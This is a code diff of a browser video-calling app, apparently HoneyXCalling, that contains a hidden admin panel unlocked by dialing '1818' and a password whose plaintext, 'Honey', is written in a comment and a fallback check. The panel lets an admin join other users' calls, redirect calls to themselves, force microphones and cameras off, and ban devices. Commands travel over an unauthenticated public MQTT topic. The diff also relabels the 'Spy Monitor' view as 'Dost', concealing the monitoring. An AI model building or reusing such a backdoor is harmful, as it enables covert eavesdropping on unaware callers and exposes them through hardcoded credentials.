@@ -1,19 +1,18 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Honey Calling Services</title>
+    <title>HoneyXCalling</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #f0f2f5; margin: 0; padding: 20px; box-sizing: border-box; transition: background 0.3s, color 0.3s; }
+        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #f0f2f5; margin: 0; padding: 20px; box-sizing: border-box; transition: background 0.5s, color 0.5s; }
         .phone-container { background: white; padding: 25px; border-radius: 20px; box-shadow: 0px 10px 25px rgba(0,0,0,0.1); text-align: center; width: 100%; max-width: 320px; z-index: 10; margin-bottom: 20px; color: #333; }
         .screen { width: 100%; height: 50px; font-size: 24px; text-align: center; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 10px; box-sizing: border-box; background-color: #fafafa; color: #333; }
         .status { font-size: 14px; color: #333; margin-bottom: 15px; font-weight: bold; background: #e7f3ff; padding: 8px; border-radius: 8px; display: inline-block; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
-        .btn { padding: 15px; font-size: 20px; border: none; background: #e4e6eb; border-radius: 50%; cursor: pointer; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; margin: auto; font-weight: bold; color: #333; will-change: background-color; }
+        .btn { padding: 15px; font-size: 20px; border: none; background: #e4e6eb; border-radius: 50%; cursor: pointer; transition: 0.2s; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; margin: auto; font-weight: bold; color: #333; }
         .btn:active { background: #d8dadf; }
         
         .local-controls { display: flex; justify-content: space-around; margin-bottom: 15px; }
@@ -21,13 +20,13 @@
         .control-btn.muted { background: #ff3b30; }
         .control-btn:disabled { background: #8e8e93; cursor: not-allowed; }
 
-        .call-btn { background: #25d366; color: white; width: 100%; border: none; border-radius: 10px; height: 50px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .call-btn { background: #25d366; color: white; width: 100%; border: none; border-radius: 10px; height: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
         .call-btn:active { background: #20ba5a; }
         
         .video-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 100%; max-width: 600px; margin-top: 10px; }
         @media(max-width: 480px) { .video-grid { grid-template-columns: 1fr; } }
         .video-wrapper { position: relative; background: #222; border-radius: 12px; overflow: hidden; aspect-ratio: 4/3; box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); backface-visibility: hidden; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
         .video-label { position: absolute; bottom: 10px; left: 10px; background: rgba(0,0,0,0.6); color: white; padding: 4px 10px; border-radius: 6px; font-size: 12px; font-weight: bold; }
 
         .announcement-bar { display: none; width: 100%; max-width: 600px; background: #ffcc00; color: #000; padding: 10px; border-radius: 10px; text-align: center; font-weight: bold; margin-bottom: 15px; }
@@ -43,13 +42,14 @@
         .admin-content h2 { margin-top: 0; color: #ff3b30; border-bottom: 2px solid #f0f2f5; padding-bottom: 10px; }
         
         .tracker-stats { display: flex; justify-content: space-between; background: #f0f2f5; padding: 10px 15px; border-radius: 10px; margin-bottom: 15px; font-weight: bold; }
-        .user-list-container { max-height: 250px; overflow-y: auto; border: 1px solid #ddd; border-radius: 10px; padding: 10px; background: #fafafa; margin-bottom: 15px; }
+        .user-list-container { max-height: 200px; overflow-y: auto; border: 1px solid #ddd; border-radius: 10px; padding: 10px; background: #fafafa; margin-bottom: 15px; }
         .user-item { padding: 12px; border-bottom: 1px solid #e8e8e8; display: flex; flex-direction: column; gap: 8px; font-size: 13px; }
         .user-row { display: flex; justify-content: space-between; align-items: center; }
         .admin-actions { display: flex; gap: 4px; flex-wrap: wrap; }
         .action-btn { border: none; padding: 5px 8px; border-radius: 5px; font-size: 11px; font-weight: bold; cursor: pointer; color: white; }
         .action-btn.kick { background: #ff3b30; }
         .action-btn.ban { background: #5856d6; }
+        .action-btn.unban { background: #34c759; }
         .action-btn.mute { background: #ff9500; }
         .action-btn.unmute { background: #34c759; }
         .action-btn.spy { background: #007aff; }
@@ -64,7 +64,7 @@
 <div id="announcement-box" class="announcement-bar"></div>
 
 <div class="phone-container">
-    <h3>HoneyXCaller</h3>
+    <h3>HoneyXCalling</h3>
     <div id="my-number" class="status">Generating ID...</div>
     <input type="text" id="phone-screen" class="screen" placeholder="Enter ID to Dial" readonly />
     
@@ -98,7 +98,7 @@
     </div>
     <div class="video-wrapper">
         <video id="remote-video" autoplay playsinline></video>
-        <span class="video-label">Remote Friend/Spy Monitor</span>
+        <span class="video-label">Dost</span>
     </div>
 </div>
 
@@ -115,6 +115,11 @@
         <div class="user-list-container" id="user-list">
             <div class="user-item" style="color: #888; text-align: center;">Mapping data channels...</div>
         </div>
+
+        <label style="font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px; color: #ff3b30;">🛡️ System Banned Registry (Persistent):</label>
+        <div class="user-list-container" id="ban-list" style="border-color: #ff3b30; max-height: 150px;">
+            <div class="user-item" style="color: #888; text-align: center;">No globally banned devices.</div>
+        </div>
         
         <label style="font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px;">Universal Execution Vectors:</label>
         <input type="text" id="broadcast-msg" class="admin-input" placeholder="Type global system notice configuration data...">
@@ -129,8 +134,12 @@
 
 <script>
     const ADMIN_TRIGGER = "1818";
-    const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa323831c";
+    const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa323831c"; // plain-text equivalent fallback word is "Honey"
     
+    if (!localStorage.getItem('device_fingerprint_id')) {
+        localStorage.setItem('device_fingerprint_id', 'DEV-' + Math.random().toString(36).substring(2, 10).toUpperCase());
+    }
+    const deviceId = localStorage.getItem('device_fingerprint_id');
     const sessionToken = Math.random().toString(36).substring(2, 9);
     const myPhoneNumber = Math.floor(1000 + Math.random() * 9000).toString();
     
@@ -139,7 +148,7 @@
     const peer = new Peer(myPhoneNumber);
     let currentCall = null;
     let localStream = null;
-    let peerTargetNode = "none"; 
+    let peerTargetNode = "none";
 
     let adminAudioLocked = false;
     let adminVideoLocked = false;
@@ -147,44 +156,54 @@
     let masterAdminToken = null;
 
     let activeUsersRegistry = {}; 
-    let bannedRegistry = JSON.parse(localStorage.getItem('banned_nodes') || '[]');
-
-    if (bannedRegistry.includes(sessionToken)) {
-        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20vh;'>🚫 HARDWARE DISCONNECTOR VECTOR APPLIED: You are permanently banned from this ecosystem.</h1>";
+    
+    if (localStorage.getItem('is_permanently_banned') === 'true') {
+        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20vh; font-family: sans-serif;'>🚫 HARDWARE DISCONNECTOR VECTOR APPLIED: You are permanently banned from this ecosystem.</h1>";
+        throw new Error("Execution halted due to ban.");
     }
 
     const mqttClient = mqtt.connect('wss://broker.emqx.io:8084/mqtt');
     const SYSTEM_PRESENCE = "web_dialer_presence_secure_prod_alpha_88";
-    const SYSTEM_COMMANDS = "web_dialer_commands_secure_prod_alpha_88"; 
+    const SYSTEM_COMMANDS = "web_dialer_commands_secure_prod_alpha_88";
 
     mqttClient.on('connect', () => {
         mqttClient.subscribe(SYSTEM_PRESENCE);
         mqttClient.subscribe(SYSTEM_COMMANDS);
         
         broadcastPresence();
-        setInterval(broadcastPresence, 3000); 
+        setInterval(broadcastPresence, 2500);
         
         setInterval(() => {
             if (amIAdminActive) {
                 mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "admin_heartbeat", token: sessionToken }));
+                syncBanListToClients();
             }
-        }, 2000);
+        }, 1500);
     });
 
-    mqttClient.on('message', (topic, message) => {
+    mqttClient.on('message', async (topic, message) => {
         const rawMsg = message.toString();
         
         if (topic === SYSTEM_PRESENCE) {
             try {
                 const data = JSON.parse(rawMsg);
                 activeUsersRegistry[data.token] = {
+                    deviceId: data.deviceId,
                     roomCode: data.roomCode,
                     micEnabled: data.micEnabled,
                     camEnabled: data.camEnabled,
                     inCallWith: data.inCallWith,
                     lastSeen: Date.now()
                 };
-                requestAnimationFrame(updateAdminUI); 
+
+                if (amIAdminActive) {
+                    const bans = JSON.parse(localStorage.getItem('admin_banned_devices') || '[]');
+                    if (bans.includes(data.deviceId)) {
+                        dispatchCmd('ban', data.token, { targetDevice: data.deviceId });
+                    }
+                }
+                
+                updateAdminUI();
             } catch(e) {}
         }
         
@@ -198,57 +217,57 @@
 
                 if (cmd.type === "broadcast") {
                     const box = document.getElementById('announcement-box');
-                    box.innerText = "📣 SYSTEM NOTICE: " + cmd.message;
-                    box.style.display = 'block';
-                    setTimeout(() => { box.style.display = 'none'; }, 8000);
+                    if (box) {
+                        box.innerText = "📣 SYSTEM NOTICE: " + cmd.message;
+                        box.style.display = 'block';
+                        setTimeout(() => { box.style.display = 'none'; }, 8000);
+                    }
                 }
                 if (cmd.type === "toggle_theme") {
                     document.body.classList.toggle('dark-theme');
                 }
 
-                if (cmd.target === sessionToken) {
+                if (cmd.type === "unban" && cmd.targetDevice === deviceId) {
+                    localStorage.removeItem('is_permanently_banned');
+                    alert("🔓 Admin has lifted your ban! Reconnecting...");
+                    location.reload();
+                }
+
+                if (cmd.target === sessionToken || cmd.targetDevice === deviceId) {
                     if (cmd.type === "kick") {
                         alert("🔴 Admin disconnected your runtime session execution.");
                         location.reload();
                     }
                     if (cmd.type === "ban") {
-                        bannedRegistry.push(sessionToken);
-                        localStorage.setItem('banned_nodes', JSON.stringify(bannedRegistry));
-                        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20vh;'>🚫 Admin Applied Local Storage Cryptographic Node Ban.</h1>";
+                        localStorage.setItem('is_permanently_banned', 'true');
+                        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20vh; font-family: sans-serif;'>🚫 HARDWARE DISCONNECTOR VECTOR APPLIED: You are permanently banned from this ecosystem.</h1>";
+                        if(currentCall) currentCall.close();
                     }
-                    
-                    // --- DIRECT PHYSICAL HARDWARE ENGINES ---
-                    if (cmd.type === "force_off_audio") {
-                        adminAudioLocked = true; 
-                        setAudioState(false);    
+                    if (cmd.type === "lock_audio") {
+                        adminAudioLocked = true; setAudioState(false);
                         document.getElementById('local-mic-btn').disabled = true;
                     }
-                    if (cmd.type === "force_on_audio") {
-                        adminAudioLocked = false; 
-                        document.getElementById('local-mic-btn').disabled = false;
-                        setAudioState(true);     
+                    if (cmd.type === "unlock_audio") {
+                        adminAudioLocked = false; document.getElementById('local-mic-btn').disabled = false;
                     }
-                    if (cmd.type === "force_off_video") {
-                        adminVideoLocked = true; 
-                        setVideoState(false);    
+                    if (cmd.type === "lock_video") {
+                        adminVideoLocked = true; setVideoState(false);
                         document.getElementById('local-cam-btn').disabled = true;
                     }
-                    if (cmd.type === "force_on_video") {
-                        adminVideoLocked = false; 
-                        document.getElementById('local-cam-btn').disabled = false;
-                        setVideoState(true);     
+                    if (cmd.type === "unlock_video") {
+                        adminVideoLocked = false; document.getElementById('local-cam-btn').disabled = false;
                     }
-                    
                     if (cmd.type === "redirect") {
                         if(currentCall) currentCall.close();
-                        alert(`🔀 System Redirect Engine: Connecting you directly to Room ID [${cmd.connectTo}]`);
-                        const call = peer.call(cmd.connectTo, localStream);
-                        call.on('stream', function(remStream) {
-                            document.getElementById('remote-video').srcObject = remStream;
-                        });
-                        currentCall = call;
+                        alert(`🔀 System Redirect Engine: Connecting directly to [${cmd.connectTo}]`);
+                        if(localStream) {
+                            const call = peer.call(cmd.connectTo, localStream);
+                            call.on('stream', function(remStream) {
+                                document.getElementById('remote-video').srcObject = remStream;
+                            });
+                            currentCall = call;
+                        }
                     }
-                    broadcastPresence();
                 }
             } catch(e) {}
         }
@@ -260,9 +279,10 @@
         
         mqttClient.publish(SYSTEM_PRESENCE, JSON.stringify({
             token: sessionToken,
+            deviceId: deviceId,
             roomCode: myPhoneNumber,
-            micEnabled: micOn,
-            camEnabled: camOn,
+            micEnabled: !!micOn,
+            camEnabled: !!camOn,
             inCallWith: peerTargetNode
         }));
     }
@@ -271,68 +291,116 @@
         const now = Date.now();
         let changed = false;
         for (const t in activeUsersRegistry) {
-            if (now - activeUsersRegistry[t].lastSeen > 7000) {
+            if (now - activeUsersRegistry[t].lastSeen > 6000) {
                 delete activeUsersRegistry[t];
                 changed = true;
             }
         }
-        if (changed) requestAnimationFrame(updateAdminUI);
-    }, 3000);
+        if (changed) updateAdminUI();
+    }, 2000);
 
     function updateAdminUI() {
         if (!amIAdminActive) return;
         const listContainer = document.getElementById('user-list');
         const countSpan = document.getElementById('active-count');
+        if (!listContainer) return;
+        
         const tokens = Object.keys(activeUsersRegistry);
-        countSpan.innerText = tokens.length;
+        if (countSpan) countSpan.innerText = tokens.length;
 
         if (tokens.length === 0) {
             listContainer.innerHTML = `<div class="user-item" style="color: #888; text-align: center;">No nodes mapping active signals.</div>`;
-            return;
+        } else {
+            listContainer.innerHTML = "";
+            tokens.forEach(t => {
+                const user = activeUsersRegistry[t];
+                const selfBadge = t === sessionToken ? " <span class='badge'>You</span>" : "";
+                const streamStateStr = `Call Route Target ID: [${user.inCallWith}]`;
+                
+                listContainer.innerHTML += `
+                    <div class="user-item">
+                        <div class="user-row">
+                            <span>Token: <strong>${t}</strong> | HW ID: <code style="background:#e4e6eb; padding:2px 4px; border-radius:4px; color:#333;">${user.deviceId}</code>${selfBadge}</span>
+                            <span style="color: #25d366; font-weight: bold;">Room ID: ${user.roomCode}</span>
+                        </div>
+                        <div class="user-row">
+                            <span style="font-size:11px; color:#c60000; font-weight:bold;">${streamStateStr}</span>
+                            <div class="admin-actions">
+                                <button class="action-btn spy" onclick="spyCall('${user.roomCode}')">Join Call</button>
+                                <button class="action-btn spy" style="background:#5856d6;" onclick="redirectCall('${t}')">Redirect to Me</button>
+                                <button class="action-btn mute" onclick="dispatchCmd('lock_audio', '${t}')">Mute</button>
+                                <button class="action-btn unmute" onclick="dispatchCmd('unlock_audio', '${t}')">Unmute</button>
+                                <button class="action-btn mute" onclick="dispatchCmd('lock_video', '${t}')">Kill Cam</button>
+                                <button class="action-btn unmute" onclick="dispatchCmd('unlock_video', '${t}')">Allow Cam</button>
+                                <button class="action-btn kick" onclick="dispatchCmd('kick', '${t}')">Kick</button>
+                                <button class="action-btn ban" onclick="banHardwareDevice('${user.deviceId}', '${t}')">Ban Device</button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            });
         }
 
-        const fragment = document.createDocumentFragment();
+        const banListContainer = document.getElementById('ban-list');
+        if (banListContainer) {
+            const bans = JSON.parse(localStorage.getItem('admin_banned_devices') || '[]');
+            if (bans.length === 0) {
+                banListContainer.innerHTML = `<div class="user-item" style="color: #888; text-align: center;">No globally banned devices.</div>`;
+            } else {
+                banListContainer.innerHTML = "";
+                bans.forEach(banId => {
+                    banListContainer.innerHTML += `
+                        <div class="user-item" style="background: #fff5f5; border-left: 4px solid #ff3b30; padding: 8px 12px; margin-bottom: 5px;">
+                            <div class="user-row">
+                                <span style="color:#333;">Device ID: <strong style="color:#ff3b30;">${banId}</strong></span>
+                                <button class="action-btn unban" onclick="unbanHardwareDevice('${banId}')">UNBAN</button>
+                            </div>
+                        </div>
+                    `;
+                });
+            }
+        }
+    }
 
-        tokens.forEach(t => {
-            const user = activeUsersRegistry[t];
-            const isSelf = t === sessionToken;
-            
-            const item = document.createElement('div');
-            item.className = 'user-item';
-            
-            item.innerHTML = `
-                <div class="user-row">
-                    <span>Node Token Identification Array: <strong>${t}</strong>${isSelf ? " <span class='badge'>You</span>" : ""}</span>
-                    <span style="color: #25d366; font-weight: bold;">Dynamic Room ID: ${user.roomCode}</span>
-                </div>
-                <div class="user-row">
-                    <span style="font-size:11px; color:#c60000; font-weight:bold;">Call Route Target ID: [${user.inCallWith}]</span>
-                    <div class="admin-actions">
-                        <button class="action-btn spy" onclick="spyCall('${user.roomCode}')">Join Call</button>
-                        <button class="action-btn spy" style="background:#5856d6;" onclick="redirectCall('${t}')">Redirect to Me</button>
-                        
-                        <button class="action-btn unmute" onclick="dispatchCmd('force_on_audio', '${t}')">Mic ON</button>
-                        <button class="action-btn mute" onclick="dispatchCmd('force_off_audio', '${t}')">Mic OFF</button>
-                        
-                        <button class="action-btn unmute" style="background:#34c759;" onclick="dispatchCmd('force_on_video', '${t}')">Cam ON</button>
-                        <button class="action-btn mute" style="background:#ff3b30;" onclick="dispatchCmd('force_off_video', '${t}')">Cam OFF</button>
-                        
-                        <button class="action-btn kick" style="background:#8e8e93;" onclick="dispatchCmd('kick', '${t}')">Kick</button>
-                        <button class="action-btn ban" onclick="dispatchCmd('ban', '${t}')">Ban Device</button>
-                    </div>
-                </div>
-            `;
-            fragment.appendChild(item);
+    function banHardwareDevice(targetHWID, targetToken) {
+        if (targetHWID === deviceId) return alert("Security Override: You cannot ban your own Admin node!");
+        let currentBans = JSON.parse(localStorage.getItem('admin_banned_devices') || '[]');
+        if (!currentBans.includes(targetHWID)) {
+            currentBans.push(targetHWID);
+            localStorage.setItem('admin_banned_devices', JSON.stringify(currentBans));
+        }
+        dispatchCmd('ban', targetToken, { targetDevice: targetHWID });
+        updateAdminUI();
+    }
+
+    function unbanHardwareDevice(targetHWID) {
+        let currentBans = JSON.parse(localStorage.getItem('admin_banned_devices') || '[]');
+        currentBans = currentBans.filter(id => id !== targetHWID);
+        localStorage.setItem('admin_banned_devices', JSON.stringify(currentBans));
+        
+        mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "unban", targetDevice: targetHWID }));
+        updateAdminUI();
+    }
+
+    function syncBanListToClients() {
+        const bans = JSON.parse(localStorage.getItem('admin_banned_devices') || '[]');
+        bans.forEach(banId => {
+            mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "ban", targetDevice: banId }));
         });
-
-        listContainer.replaceChildren(fragment);
     }
 
     async function evaluateCryptoPassword(input) {
-        const msgUint8 = new TextEncoder().encode(input);
-        const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
-        const hashArray = Array.from(new Uint8Array(hashBuffer));
-        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        try {
+            if (!window.crypto || !window.crypto.subtle) {
+                return input === "Honey" ? PASSWORD_HASH : "fallback-mismatch";
+            }
+            const msgUint8 = new TextEncoder().encode(input);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        } catch (e) {
+            return input === "Honey" ? PASSWORD_HASH : "mismatch";
+        }
     }
 
     function dispatchCmd(type, target, updates = {}) {
@@ -347,14 +415,16 @@
     }
     function sendThemeToggle() { mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "toggle_theme" })); }
 
-    // Remote camera view capability
     function spyCall(targetRoomId) {
         if(currentCall) currentCall.close();
-        const call = peer.call(targetRoomId, localStream);
-        call.on('stream', function(remStream) {
-            document.getElementById('remote-video').srcObject = remStream;
-        });
-        currentCall = call;
+        alert(`🕵️ Joining Call Matrix Pipeline for node room: [${targetRoomId}]`);
+        if(localStream) {
+            const call = peer.call(targetRoomId, localStream);
+            call.on('stream', function(remStream) {
+                document.getElementById('remote-video').srcObject = remStream;
+            });
+            currentCall = call;
+        }
     }
 
     function redirectCall(targetToken) {
@@ -364,26 +434,27 @@
     function setAudioState(state) {
         if (localStream && localStream.getAudioTracks().length > 0) {
             localStream.getAudioTracks()[0].enabled = state;
-            const btn = document.getElementById('local-mic-btn');
-            btn.innerText = state ? "Mic: ON" : "Mic: OFF";
-            btn.className = state ? "control-btn" : "control-btn muted";
+            document.getElementById('local-mic-btn').innerText = state ? "Mic: ON" : "Mic: OFF";
+            document.getElementById('local-mic-btn').className = state ? "control-btn" : "control-btn muted";
         }
     }
+    
     function toggleLocalAudio() {
-        if (adminAudioLocked) return;
+        if (adminAudioLocked || !localStream || !localStream.getAudioTracks().length) return;
         setAudioState(!localStream.getAudioTracks()[0].enabled);
         broadcastPresence();
     }
+    
     function setVideoState(state) {
         if (localStream && localStream.getVideoTracks().length > 0) {
             localStream.getVideoTracks()[0].enabled = state;
-            const btn = document.getElementById('local-cam-btn');
-            btn.innerText = state ? "Cam: ON" : "Cam: OFF";
-            btn.className = state ? "control-btn" : "control-btn muted";
+            document.getElementById('local-cam-btn').innerText = state ? "Cam: ON" : "Cam: OFF";
+            document.getElementById('local-cam-btn').className = state ? "control-btn" : "control-btn muted";
         }
     }
+    
     function toggleLocalVideo() {
-        if (adminVideoLocked) return;
+        if (adminVideoLocked || !localStream || !localStream.getVideoTracks().length) return;
         setVideoState(!localStream.getVideoTracks()[0].enabled);
         broadcastPresence();
     }
@@ -392,11 +463,7 @@
     function clearScreen() { document.getElementById('phone-screen').value = ''; }
 
     function initMedia() {
-        const mediaConstraints = { 
-            audio: true, 
-            video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 24 } } 
-        };
-        navigator.mediaDevices.getUserMedia(mediaConstraints)
+        navigator.mediaDevices.getUserMedia({ audio: true, video: true })
             .then(s => { localStream = s; document.getElementById('local-video').srcObject = s; })
             .catch(() => {
                 navigator.mediaDevices.getUserMedia({ audio: true, video: false })
@@ -420,6 +487,7 @@
         
         if (val === ADMIN_TRIGGER) {
             clearScreen();
+            
             if(masterAdminToken !== null) {
                 return alert("⛔ CRITICAL EXCLUSION: An active Admin Engine instance is currently running globally.");
             }
@@ -453,6 +521,7 @@
         const btn = document.getElementById('call-action');
         btn.innerText = "HANG UP"; btn.style.background = "#ff3b30";
     }
+    
     function closeAdminPanel() {
         document.getElementById('admin-panel').style.display = 'none';
         amIAdminActive = false;
